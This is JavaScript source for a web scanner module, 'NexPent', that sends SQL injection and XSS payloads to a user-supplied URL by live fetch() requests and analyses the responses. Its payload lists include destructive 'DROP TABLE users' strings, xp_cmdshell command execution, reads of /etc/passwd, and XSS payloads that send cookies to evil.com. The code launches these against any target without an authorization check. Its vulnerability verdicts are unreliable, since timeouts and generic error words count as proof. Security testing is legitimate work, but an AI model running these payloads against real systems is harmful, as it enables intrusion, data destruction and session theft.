/* ============================================
   NexPent — SQL Injection & XSS Scanner Module
   REAL-TIME: Sends actual payloads via fetch()
   and analyzes live HTTP responses.
   ============================================ */

const ScannerModule = (() => {
    // SQL Injection Payloads
    const sqliPayloads = {
        basic: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "1 OR 1=1",
        ],
        moderate: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "admin'--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        ],
        aggressive: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "\") OR (\"1\"=\"1",
            "1' ORDER BY 1--",
            "1' ORDER BY 5--",
            "1' ORDER BY 10--",
            "1' ORDER BY 50--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT username,password FROM users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND (SELECT TOP 1 username FROM users)='admin'--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "1; DROP TABLE users--",
            "1; SELECT * FROM users--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; EXEC xp_cmdshell('dir');--",
            "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
            "1' AND extractvalue(1,concat(0x7e,version()))--",
            "1' AND updatexml(1,concat(0x7e,version()),1)--",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
            "-1' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--",
        ],
    };

    // XSS Payloads
    const xssPayloads = {
        reflected: [
            '<script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            '<body onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'-alert('XSS')-'",
            '<iframe src="javascript:alert(\'XSS\')">',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<a href="javascript:alert(\'XSS\')">click</a>',
        ],
        stored: [
            '<script>fetch("http://evil.com?c="+document.cookie)</script>',
            '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">',
            "<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>",
            '<svg/onload=fetch("//evil.com?"+document.cookie)>',
            '<div style="background:url(javascript:alert(\'XSS\'))">',
        ],
        dom: [
            '#"><img src=x onerror=alert(1)>',
            "javascript:alert(document.domain)",
            '"><svg onload=alert(1)>',
            "'-alert(1)-'",
            '\\"-alert(1)}}//',
            "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
        ],
    };

    // Error signatures indicating potential SQLi vulnerability
    const sqliErrorSignatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "microsoft ole db provider",
        "microsoft sql native client",
        "invalid query",
        "sql syntax",
        "mysql_fetch",
        "pg_query",
        "sqlite3::query",
        "ora-01756",
        "quoted string not properly terminated",
        "sqlstate",
        "syntax error",
        "unterminated string",
        "jdbc exception",
        "hibernate exception",
        "pdo exception",
        "odbc driver",
        "dynamic sql error",
        "fatal error",
        "mysql_num_rows",
        "mysql_result",
        "pg_exec",
        "supplied argument is not a valid",
        "on line",
        "unexpected end of sql command",
        "server error in",
        "microsoft jet database engine",
        "ora-00933",
        "ora-06512",
    ];

    function getPayloads(type, level, customPayloads) {
        let payloads;
        if (type === "sqli") {
            payloads = [...(sqliPayloads[level] || sqliPayloads.moderate)];
        } else {
            const xssType = level || "all";
            if (xssType === "all") {
                payloads = [...xssPayloads.reflected, ...xssPayloads.stored, ...xssPayloads.dom];
            } else {
                payloads = [...(xssPayloads[xssType] || xssPayloads.reflected)];
            }
        }

        if (customPayloads && customPayloads.trim()) {
            const custom = customPayloads.split("\n").filter((p) => p.trim());
            payloads = [...payloads, ...custom];
        }

        return payloads;
    }

    /**
     * Real-Time SQLi Scanner — sends actual fetch() requests with payloads
     * and analyzes live HTTP responses for SQL error signatures.
     */
    async function runSQLiScan(config, outputEl, progressEl, fillEl, textEl) {
        const { url, method, postData, level, customPayloads } = config;
        const payloads = getPayloads("sqli", level, customPayloads);
        const results = { target: url, method, vulns: [], tested: 0, total: payloads.length };

        progressEl.style.display = "flex";

        addLine(outputEl, "info", "[SCAN]", `Starting REAL-TIME SQL Injection scan on: ${url}`);
        addLine(outputEl, "info", "[INFO]", `Method: ${method} | Level: ${level} | Payloads: ${payloads.length}`);
        addLine(outputEl, "warning", "[LIVE]", "⚡ Live HTTP requests — analyzing real server responses");
        addLine(outputEl, "system", "[SYS]", "─".repeat(60));

        // First, get a baseline response for comparison
        let baselineBody = "";
        let baselineStatus = 0;
        let baselineLength = 0;
        try {
            addLine(outputEl, "info", "[BASE]", `Fetching baseline response from ${url}...`);
            const baseResp = await fetchWithTimeout(url, { method: "GET", mode: "cors" }, 8000);
            baselineStatus = baseResp.status;
            baselineBody = await baseResp.text();
            baselineLength = baselineBody.length;
            addLine(outputEl, "success", "[BASE]", `Baseline: HTTP ${baselineStatus} | ${baselineLength} bytes`);
        } catch (err) {
            addLine(outputEl, "warning", "[BASE]", `Baseline fetch failed: ${err.message} — will compare payloaded responses against each other`);
        }
        addLine(outputEl, "system", "[SYS]", "─".repeat(60));

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            results.tested++;
            const pct = Math.round(((i + 1) / payloads.length) * 100);
            fillEl.style.width = pct + "%";
            textEl.textContent = pct + "%";

            try {
                let testUrl, fetchOpts;

                if (method === "GET") {
                    // Inject payload into URL query parameter
                    const separator = url.includes("?") ? "&" : "?";
                    testUrl = `${url}${separator}id=${encodeURIComponent(payload)}`;
                    fetchOpts = { method: "GET", mode: "cors" };
                } else {
                    // POST: inject payload into body
                    testUrl = url;
                    const body = postData
                        ? postData.replace(/=([^&]*)/g, `=${encodeURIComponent(payload)}`)
                        : `username=${encodeURIComponent(payload)}&password=${encodeURIComponent(payload)}`;
                    fetchOpts = {
                        method: "POST",
                        mode: "cors",
                        headers: { "Content-Type": "application/x-www-form-urlencoded" },
                        body,
                    };
                }

                const resp = await fetchWithTimeout(testUrl, fetchOpts, 6000);
                const respBody = await resp.text();
                const respBodyLower = respBody.toLowerCase();

                // ── Analyze the real response for SQLi evidence ──
                const detection = analyzeSQLiResponse(payload, resp, respBody, respBodyLower, baselineBody, baselineLength, baselineStatus);

                if (detection.detected) {
                    results.vulns.push({
                        payload,
                        type: detection.type,
                        severity: detection.severity,
                        evidence: detection.evidence,
                        httpStatus: resp.status,
                    });
                    addLine(outputEl, "vuln", "[VULN]", `⚠ ${detection.type} SQLi detected! HTTP ${resp.status}`);
                    addLine(outputEl, "error", "[PAY]", `Payload: ${payload}`);
                    addLine(outputEl, "warning", "[EVD]", `Evidence: ${detection.evidence}`);
                    addLine(outputEl, "system", "[SEV]", `Severity: ${detection.severity.toUpperCase()}`);
                    addLine(outputEl, "system", "[SYS]", "─".repeat(40));
                } else {
                    addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(payload, 50)} — HTTP ${resp.status} — No injection detected`);
                }
            } catch (err) {
                // Network errors can also indicate vulnerabilities (e.g., server crash)
                if (err.message.includes("timeout") || err.message.includes("Timeout")) {
                    addLine(outputEl, "warning", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(payload, 40)} — ⏱ TIMEOUT (possible time-based blind SQLi)`);
                    results.vulns.push({
                        payload,
                        type: "Time-based Blind",
                        severity: "high",
                        evidence: "Request timed out — server may have executed SLEEP/WAITFOR",
                        httpStatus: "TIMEOUT",
                    });
                } else {
                    addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(payload, 40)} — Error: ${err.message}`);
                }
            }
        }

        addLine(outputEl, "system", "[SYS]", "─".repeat(60));
        addLine(outputEl, "info", "[DONE]", `Scan complete. ${results.vulns.length} potential vulnerabilities found.`);

        if (results.vulns.length > 0) {
            addLine(outputEl, "error", "[ALERT]", `⚠ ${results.vulns.length} SQL Injection vulnerabilities detected!`);
        } else {
            addLine(outputEl, "success", "[OK]", "No SQL injection vulnerabilities detected.");
        }

        return results;
    }

    /**
     * Analyze a real HTTP response for SQL injection evidence.
     */
    function analyzeSQLiResponse(payload, resp, body, bodyLower, baselineBody, baselineLength, baselineStatus) {
        // 1. Check for SQL error messages in response
        for (const sig of sqliErrorSignatures) {
            if (bodyLower.includes(sig)) {
                return {
                    detected: true,
                    type: "Error-based",
                    severity: "critical",
                    evidence: `SQL error signature in response: "${sig}"`,
                };
            }
        }

        // 2. Check for 500 Internal Server Error (common with SQLi)
        if (resp.status === 500 && baselineStatus !== 500) {
            return {
                detected: true,
                type: "Error-based",
                severity: "high",
                evidence: `Server returned HTTP 500 (baseline was ${baselineStatus}) — query may have caused a server error`,
            };
        }

        // 3. Check for significant response length difference (Boolean-based blind)
        if (baselineLength > 0) {
            const diff = Math.abs(body.length - baselineLength);
            const ratio = diff / baselineLength;
            if (ratio > 0.5 && body.length > baselineLength && /OR\s+'?1'?\s*=\s*'?1/i.test(payload)) {
                return {
                    detected: true,
                    type: "Boolean-based Blind",
                    severity: "critical",
                    evidence: `Response size changed significantly: ${baselineLength} → ${body.length} bytes (${(ratio * 100).toFixed(0)}% increase)`,
                };
            }
        }

        // 4. Check if UNION SELECT returned extra data
        if (/UNION\s+SELECT/i.test(payload) && body.length > baselineLength * 1.3) {
            return {
                detected: true,
                type: "UNION-based",
                severity: "critical",
                evidence: `UNION payload caused response growth: ${baselineLength} → ${body.length} bytes`,
            };
        }

        // 5. Check for database-specific keywords in response that weren't in baseline
        const dbKeywords = ["mysql", "mariadb", "postgresql", "sqlite", "oracle", "mssql", "information_schema", "pg_catalog", "sys.databases"];
        for (const kw of dbKeywords) {
            if (bodyLower.includes(kw) && !baselineBody.toLowerCase().includes(kw)) {
                return {
                    detected: true,
                    type: "Information Disclosure",
                    severity: "high",
                    evidence: `Database keyword "${kw}" appeared in response (not in baseline)`,
                };
            }
        }

        // 6. Check for stack trace / debug info leaked
        if ((bodyLower.includes("stack trace") || bodyLower.includes("traceback") || bodyLower.includes("exception")) &&
            !baselineBody.toLowerCase().includes("stack trace")) {
            return {
                detected: true,
                type: "Error-based",
                severity: "high",
                evidence: "Stack trace or exception details exposed in response",
            };
        }

        return { detected: false };
    }

    /**
     * Real-Time XSS Scanner — sends actual fetch() requests with XSS payloads
     * and checks if they are reflected in the response without sanitization.
     */
    async function runXSSScan(config, outputEl, progressEl, fillEl, textEl) {
        const { url, param, type, customPayloads } = config;
        const payloads = getPayloads("xss", type, customPayloads);
        const results = { target: url, param, vulns: [], tested: 0, total: payloads.length };

        progressEl.style.display = "flex";

        addLine(outputEl, "info", "[SCAN]", `Starting REAL-TIME XSS scan on: ${url}`);
        addLine(outputEl, "info", "[INFO]", `Parameter: ${param} | Type: ${type} | Payloads: ${payloads.length}`);
        addLine(outputEl, "warning", "[LIVE]", "⚡ Live HTTP requests — checking for reflected/unescaped payloads");
        addLine(outputEl, "system", "[SYS]", "─".repeat(60));

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            results.tested++;
            const pct = Math.round(((i + 1) / payloads.length) * 100);
            fillEl.style.width = pct + "%";
            textEl.textContent = pct + "%";

            try {
                // Inject payload into URL parameter
                const separator = url.includes("?") ? "&" : "?";
                const testUrl = `${url}${separator}${encodeURIComponent(param)}=${encodeURIComponent(payload)}`;

                const resp = await fetchWithTimeout(testUrl, { method: "GET", mode: "cors" }, 6000);
                const respBody = await resp.text();

                // ── Analyze response for XSS reflection ──
                const detection = analyzeXSSResponse(payload, resp, respBody);

                if (detection.detected) {
                    results.vulns.push({
                        payload,
                        type: detection.type,
                        severity: detection.severity,
                        context: detection.context,
                        httpStatus: resp.status,
                    });
                    addLine(outputEl, "vuln", "[VULN]", `${detection.type} XSS vulnerability detected!`);
                    addLine(outputEl, "error", "[PAY]", `Payload: ${escapeHtml(payload)}`);
                    addLine(outputEl, "warning", "[CTX]", `Context: ${detection.context}`);
                    addLine(outputEl, "system", "[SEV]", `Severity: ${detection.severity.toUpperCase()}`);
                    addLine(outputEl, "system", "[SYS]", "─".repeat(40));
                } else {
                    addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(escapeHtml(payload), 50)} — HTTP ${resp.status} — Filtered/Escaped`);
                }
            } catch (err) {
                addLine(outputEl, "system", `[${i + 1}/${payloads.length}]`, `Testing: ${truncate(escapeHtml(payload), 40)} — Error: ${err.message}`);
            }
        }

        addLine(outputEl, "system", "[SYS]", "─".repeat(60));
        addLine(outputEl, "info", "[DONE]", `XSS scan complete. ${results.vulns.length} potential vulnerabilities found.`);

        if (results.vulns.length > 0) {
            addLine(outputEl, "error", "[ALERT]", `⚠ ${results.vulns.length} XSS vulnerabilities detected!`);
        } else {
            addLine(outputEl, "success", "[OK]", "No XSS vulnerabilities detected. Input appears sanitized.");
        }

        return results;
    }

    /**
     * Analyze real HTTP response for reflected XSS payloads.
     */
    function analyzeXSSResponse(payload, resp, body) {
        // Check if the payload appears in the response body WITHOUT encoding
        // This is the core of reflected XSS detection

        // 1. Direct reflection check (most critical — payload appears raw in HTML)
        if (body.includes(payload)) {
            // Check for CSP header which would mitigate this
            const csp = resp.headers.get("content-security-policy") || "";
            const hasMitigation = csp.includes("script-src") && !csp.includes("unsafe-inline");

            if (/^<script/i.test(payload)) {
                return {
                    detected: true,
                    type: "Reflected",
                    severity: hasMitigation ? "medium" : "critical",
                    context: `Script tag reflected unescaped in response body${hasMitigation ? " (CSP may mitigate)" : ""}`,
                };
            }
            if (/onerror\s*=/i.test(payload) || /onload\s*=/i.test(payload)) {
                return {
                    detected: true,
                    type: "Reflected",
                    severity: "high",
                    context: "Event handler payload reflected unescaped in response body",
                };
            }
            if (/javascript:/i.test(payload)) {
                return {
                    detected: true,
                    type: "DOM-based",
                    severity: "medium",
                    context: "JavaScript URI payload reflected in response body",
                };
            }
            if (/document\.cookie/i.test(payload)) {
                return {
                    detected: true,
                    type: "Stored/Reflected",
                    severity: "critical",
                    context: "Cookie-stealing payload reflected unescaped — data exfiltration possible",
                };
            }
            if (/fetch\s*\(/i.test(payload) || /new Image/i.test(payload)) {
                return {
                    detected: true,
                    type: "Stored",
                    severity: "critical",
                    context: "Data exfiltration payload reflected unescaped in response",
                };
            }
            // Generic reflection
            return {
                detected: true,
                type: "Reflected",
                severity: "high",
                context: "XSS payload reflected in response without sanitization",
            };
        }

        // 2. Partial reflection (some characters not encoded)
        // Check for key dangerous characters
        const dangerousChars = ["<", ">", '"', "'", "(", ")"];
        let unescapedCount = 0;
        for (const char of dangerousChars) {
            if (payload.includes(char) && body.includes(char)) {
                // Check if this specific char context from our payload exists
                const payloadFragment = payload.substring(0, payload.indexOf(char) + 3);
                if (body.includes(payloadFragment)) {
                    unescapedCount++;
                }
            }
        }

        if (unescapedCount >= 3) {
            return {
                detected: true,
                type: "Reflected",
                severity: "medium",
                context: `Multiple dangerous characters (${unescapedCount}) reflected without encoding`,
            };
        }

        // 3. Check missing security headers
        const xContentType = resp.headers.get("x-content-type-options");
        const xXssProtection = resp.headers.get("x-xss-protection");

        if (!xContentType && !xXssProtection && resp.status === 200) {
            // Not a vulnerability by itself, but noteworthy — only flag if combined with partial reflection
            if (unescapedCount >= 1) {
                return {
                    detected: true,
                    type: "Reflected",
                    severity: "low",
                    context: "Partial reflection detected with missing X-Content-Type-Options and X-XSS-Protection headers",
                };
            }
        }

        return { detected: false };
    }

    // ── Fetch with timeout ──
    function fetchWithTimeout(url, options, timeoutMs = 6000) {
        return Promise.race([
            fetch(url, options),
            new Promise((_, reject) =>
                setTimeout(() => reject(new Error("Request timeout")), timeoutMs)
            ),
        ]);
    }

    // Utility functions
    function addLine(container, type, time, msg) {
        const line = document.createElement("div");
        line.className = `terminal-line ${type}`;
        line.innerHTML = `<span class="time">${time}</span><span class="msg">${msg}</span>`;
        container.appendChild(line);
        container.scrollTop = container.scrollHeight;
    }

    function sleep(ms) {
        return new Promise((r) => setTimeout(r, ms));
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function truncate(str, len) {
        return str.length > len ? str.substring(0, len) + "..." : str;
    }

    function escapeHtml(str) {
        const div = document.createElement("div");
        div.textContent = str;
        return div.innerHTML;
    }

    return {
        runSQLiScan,
        runXSSScan,
        addLine,
        sleep,
        randomInt,
        truncate,
        escapeHtml,
        sqliErrorSignatures,
    };
})();
